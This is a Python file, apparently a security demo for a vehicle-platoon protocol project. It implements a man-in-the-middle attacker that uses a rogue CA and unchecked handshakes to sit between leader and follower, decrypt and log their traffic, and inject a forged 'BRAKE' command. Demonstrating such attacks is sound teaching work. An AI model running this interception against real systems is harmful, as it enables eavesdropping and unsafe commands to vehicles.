"""Man-in-the-middle attacker (for the demo)"""

import socket
from protocol.handshake import follower_handshake, leader_handshake
from identity.pki import provision_platoon

class FakeChannel:
    def __init__(self, sock, addr, initial_data=None):
        self.sock = sock
        self.addr = addr
        self.initial_data = initial_data

    def send(self, data):
        self.sock.sendto(data, self.addr)

    def recv(self, bufsize=65536):
        if self.initial_data:
            d = self.initial_data
            self.initial_data = None
            return d
        d, _ = self.sock.recvfrom(bufsize)
        return d

def run_mitm(attacker_addr, target_addr, log):
    # generate a rogue CA and cert
    ca_public, creds = provision_platoon(["mitm"])
    mitm_cred = creds["mitm"]

    sock_up = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock_up.bind(attacker_addr)
    
    data, leader_addr = sock_up.recvfrom(65536)
    up_chan = FakeChannel(sock_up, leader_addr, data)
    session_with_leader = follower_handshake(up_chan, mitm_cred, ca_public, secure=False, log=lambda m: None)
    
    sock_down = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    down_chan = FakeChannel(sock_down, target_addr)
    session_with_follower = leader_handshake(down_chan, mitm_cred, ca_public, secure=False, log=lambda m: None)
    
    log("attacker established BOTH sessions -- it is now in the middle")
    log("handshake completed THROUGH the attacker (no identity checks)")
    
    first = True
    while True:
        data, _ = sock_up.recvfrom(65536)
        payload, seq, _ = session_with_leader.decrypt(data)
        log(f'STOLEN plaintext from leader: "{payload.decode()}"')
        
        if first:
            payload = b"BRAKE (injected by attacker)"
            log(f'MODIFIED command before forwarding -> "BRAKE (injected by attacker)"')
            first = False
            
        packet = session_with_follower.encrypt(payload)
        sock_down.sendto(packet, target_addr)
        
        data, _ = sock_down.recvfrom(65536)
        ack_payload, _, _ = session_with_follower.decrypt(data)
        
        ack_packet = session_with_leader.encrypt(ack_payload)
        sock_up.sendto(ack_packet, leader_addr)
